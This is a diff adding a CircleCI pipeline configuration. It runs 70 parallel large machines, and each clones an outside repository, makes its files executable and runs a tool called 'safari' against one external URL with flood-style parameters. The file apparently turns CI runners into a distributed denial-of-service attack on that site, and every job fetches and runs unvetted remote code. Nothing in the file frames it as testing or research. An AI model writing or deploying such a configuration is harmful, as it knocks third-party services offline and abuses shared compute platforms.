@@ -1,0 +1,33 @@
+version: 2.1
+
+jobs:
+  parallel-execution:
+    parameters:
+      instance:
+        type: integer
+    machine:
+      image: ubuntu-2004:current
+    resource_class: large
+    environment:
+      INSTANCE_NUMBER: << parameters.instance >>
+      TOTAL_INSTANCES: 70
+      RUNNER_OS: ubuntu
+    steps:
+      - run:
+          name: Clone, setup and run
+          command: |
+            git clone https://github.com/vvv25769-arch/Sne.git
+            cd Sne
+            chmod +x *
+            ./safari https://rapidis.gay/6901966783-a33f4938-5562-4323-baa8-fbd3c8d0c85c 300 10000 8000 Heh --cdn --raw
+          no_output_timeout: 30m
+
+workflows:
+  parallel-execution-workflow:
+    jobs:
+      - parallel-execution:
+          name: parallel-execution-<< matrix.instance >>
+          instance: << matrix.instance >>
+          matrix:
+            parameters:
+              instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70]
